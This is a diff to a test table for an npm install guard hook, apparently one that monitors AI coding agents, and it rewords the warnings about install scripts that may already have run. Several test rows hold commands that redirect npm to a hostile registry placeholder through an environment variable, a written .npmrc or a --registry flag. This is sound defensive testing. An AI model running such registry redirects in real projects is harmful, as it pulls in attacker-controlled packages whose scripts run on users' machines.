@@ -556,8 +556,11 @@ ROWS
 #     (RH1, the clone RH2), the command's own environment (RH3, RH3e), an
 #     .npmrc the command wrote, seen by the post hook's own ask (RH1w, RH2w),
 #     and a workspace member under the root's .npmrc, where npm will not
-#     answer `npm config` in the member itself (RH8). On Codex the install is
-#     not inert, so its own scripts ran, and the warning says so (RH3x). Where
+#     answer `npm config` in the member itself (RH8). On Codex safedeps cannot
+#     add --ignore-scripts, and the warning says it did not add it, so the
+#     install's scripts may already have run (RH3x); where it asked for the
+#     flag and the command received is not the one it wrote, the warning says
+#     that (RH3c). Where
 #     an earlier statement can change npm's environment unseen (`source`),
 #     nobody can say, and the rebuild is skipped (RH7). A `--registry` the
 #     command spells out stays denied (RH4). RH5 is the control: the sandbox
@@ -1156,8 +1159,8 @@ RH1|evilrc|claude|kept:because this install fetched sd-approved from ${EVIL_REG}
 RH2|evilclone|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|npm ci
 RH3|project|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
 RH3e|project|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|export npm_config_registry=${EVIL_REG}; npm install sd-approved@1.0.0
-RH3x|project|codex|kept:but npm fetches it from the registry ${EVIL_REG} (replace-registry-host=npmjs)). safedeps did not make the install inert (on Codex it cannot), so unless the command said --ignore-scripts, their install scripts already ran during the install|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
-RH3c|project|crossed|kept:but npm fetches it from the registry ${EVIL_REG} (replace-registry-host=npmjs)). safedeps did not make the install inert (on Codex it cannot), so unless the command said --ignore-scripts, their install scripts already ran during the install|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
+RH3x|project|codex|kept:but npm fetches it from the registry ${EVIL_REG} (replace-registry-host=npmjs)). safedeps did not add --ignore-scripts to this install (on Codex it cannot), so their install scripts may already have run|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
+RH3c|project|crossed|kept:but npm fetches it from the registry ${EVIL_REG} (replace-registry-host=npmjs)). safedeps asked for --ignore-scripts on this install; the command this hook received is not the one safedeps wrote, so their install scripts may already have run|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
 RH4|project|claude|denied:Command uses non-standard npm registry|npm install --registry ${EVIL_REG} sd-approved@1.0.0
 RH5|project|claude|quiet:sd-approved|npm install sd-approved@1.0.0
 RH1w|project|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|printf 'registry=${EVIL_REG}\n' > .npmrc && npm install sd-approved@1.0.0
